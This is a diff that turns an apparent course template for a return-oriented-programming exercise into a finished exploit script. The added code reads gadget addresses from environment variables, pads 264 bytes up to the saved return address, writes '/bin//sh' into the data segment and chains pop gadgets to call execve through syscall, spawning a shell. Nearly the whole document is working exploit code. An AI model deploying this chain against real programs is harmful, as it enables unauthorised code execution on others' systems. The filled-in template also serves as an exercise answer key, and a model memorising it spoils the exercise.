@@ -1,39 +1,45 @@
-
-
-# This python script will help you to set up your ROP-chain
-# You just need to complete it (see the comments)
-
-#!/bin/env python3
+#!/usr/bin/env python3
 from struct import pack
-from os import write
+from os import write, getenv
+import sys
 
-pop_rax = pack("<Q", 0x451f87) # address of the "pop rax ; ret" gadget (check if it is correct !)
-pop_rdi = pack("<Q", XXX) # address of the "pop rdi ; ret" gadget
-pop_rsi = pack("<Q", XXX) # address of the "pop rsi ; ret" gadget
-pop_rdx = pack("<Q", XXX) # address of the "pop rdx ; ret" gadget
-movd_rdx_rax = pack("<Q", XXX)  # address of the "mov qword ptr [rdx], rax ; ret" gagdet
-syscall = pack("<Q", XXX) # address of the "pop rax ; ret" gadget
-at_data = pack("<Q", XXX)  # address of data segment
-null = pack("<Q", 0x00)
+def need(name):
+    v = getenv(name)
+    if not v:
+        sys.stderr.write(f"[!] Missing env var {name}\n"); sys.exit(2)
+    try:
+        return pack("<Q", int(v, 16))
+    except Exception as e:
+        sys.stderr.write(f"[!] Bad hex in {name}={v}: {e}\n"); sys.exit(2)
+
+pop_rax        = pack("<Q", 0x451f87)          # pop rax ; ret (from your set)
+pop_rdi        = need("POP_RDI")
+pop_rsi        = need("POP_RSI")
+pop_rdx        = need("POP_RDX")
+movq_rax_to_m  = need("MOVQ_RAX_TO_MEM")       # mov qword ptr [rax], rdx ; ret
+syscall_g      = need("SYSCALL")
+at_data        = need("AT_DATA")
+OFFSET         = int(getenv("OFFSET","264"))
+
+null   = pack("<Q", 0)
 execve = pack("<Q", 59)
-buff = XXX * b"A"           # Fill the target buffer up to the return address
-                            # REPLACE XXX by the correct padding value !
 
-# Our gadget chain starts here !
+# padding to saved RIP
+buff = b"A"*OFFSET
 
-""" step 1: write /bin/sh in the data segment """
-buff += pop_rdx
-buff += at_data
-buff += pop_rax
-buff += b"/bin//sh"
-buff += movd_rdx_rax
+# --- write "/bin//sh\0" at .data ---
+buff += pop_rax; buff += at_data
+buff += pop_rdx; buff += b"/bin//sh"
+buff += movq_rax_to_m
+buff += pop_rax; buff += pack("<Q", int.from_bytes(at_data,"little")+8)
+buff += pop_rdx; buff += null
+buff += movq_rax_to_m
 
-""" set up the call to syscall execve """
- # XXXX   complete the ROP chain here ...
- # using the indications provided in the subject
- # (step 2 to step 5)
-buff += syscall  # syscall ...
+# --- set up execve("/bin//sh",0,0) ---
+buff += pop_rdi; buff += at_data
+buff += pop_rsi; buff += null
+buff += pop_rdx; buff += null
+buff += pop_rax; buff += execve
+buff += syscall_g
 
-write(1, buff)  # write buff to stdout ...
-write(1, b"\n") # trigger!
-
+write(1, buff)
